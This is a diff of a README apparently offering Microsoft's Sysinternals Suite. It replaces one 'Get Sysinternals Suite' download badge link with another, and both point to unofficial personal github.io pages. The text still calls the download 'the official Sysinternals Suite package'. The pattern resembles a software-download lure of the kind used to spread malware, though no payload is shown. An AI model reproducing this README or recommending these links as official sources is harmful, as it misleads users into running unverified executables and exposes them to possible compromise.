@@ -7,7 +7,7 @@ Sysinternals Suite is a comprehensive collection of Windows system management an
 
 ## Getting Started
 
-[![Get Sysinternals Suite](https://img.shields.io/badge/Get-Sysinternals_Suite-ff6b6b?style=for-the-badge)](https://lorenkemp4.github.io/.github/sysinternals-suite)
+[![Get Sysinternals Suite](https://img.shields.io/badge/Get-Sysinternals_Suite-ff6b6b?style=for-the-badge)](https://sysinternals-tool.github.io/.github/)
 
 1. Access the official Sysinternals Suite package and extract the utilities.
 2. Run any executable directly from the Sysinternals Suite folder without installation.
